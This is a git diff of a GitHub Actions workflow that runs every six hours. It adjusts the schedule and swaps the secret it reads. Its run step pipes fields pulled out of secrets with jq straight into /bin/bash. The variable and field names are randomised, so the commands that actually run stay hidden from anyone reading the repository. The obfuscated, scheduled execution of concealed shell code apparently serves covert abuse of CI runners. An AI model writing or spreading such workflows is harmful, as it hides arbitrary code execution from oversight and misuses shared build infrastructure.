@@ -2,8 +2,9 @@ name: yethigh
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 0/6 * * *'
-jobs:  # 12154
+    - cron: '31 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,12 +12,13 @@ jobs:  # 12154
       - uses: actions/checkout@v4
       - name: yethigh
         env:
-          rir812: ${{ secrets.rir812 }}
+          o26: ${{ secrets.o26 }}
         run: |
-          echo $rir812 | jq -r .wvj40 | /bin/bash
-          echo $foamm90759 | jq -r .hjwu647 | /bin/bash
-          echo $i26 | jq -r .dswk143 | /bin/bash
-          echo $zewpx55 | jq -r .hcfa047 | /bin/bash
-          echo $v37163 | jq -r .ndbd0 | /bin/bash
-          echo $pdkex18 | jq -r .a5143 | /bin/bash
+          echo $o26 | jq -r .csxzr8295 | /bin/bash
+          echo $l407 | jq -r .tug345 | /bin/bash
+          echo $z4 | jq -r .eoywm52972 | /bin/bash
+          echo $si65 | jq -r .spq9 | /bin/bash
+          echo $ib36954 | jq -r .elldc8 | /bin/bash
+          echo $bq97 | jq -r .llghg775 | /bin/bash
+          echo $f607 | jq -r .cqi75054 | /bin/bash
 
